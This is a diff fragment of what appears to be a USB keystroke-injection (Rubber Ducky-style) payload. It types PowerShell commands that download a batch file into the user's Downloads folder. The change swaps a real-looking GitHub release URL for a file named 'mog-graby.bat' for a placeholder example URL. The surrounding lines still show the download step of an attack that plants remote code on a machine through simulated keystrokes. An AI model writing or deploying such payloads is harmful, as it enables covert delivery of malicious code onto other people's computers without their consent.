@@ -15,7 +15,7 @@ STRING $filepath = "$env:USERPROFILE\Downloads\$filename"
 ENTER
 DELAY 500
 
-STRING Invoke-WebRequest -Uri "https://github.com/test123311/test-repository/releases/download/fuck-you/mog-graby.bat" -OutFile $filepath
+STRING Invoke-WebRequest -Uri "DOWNLOAD URL example: github.com/example/example/main/subscribe.bat" -OutFile $filepath
 ENTER
 DELAY 2000
 
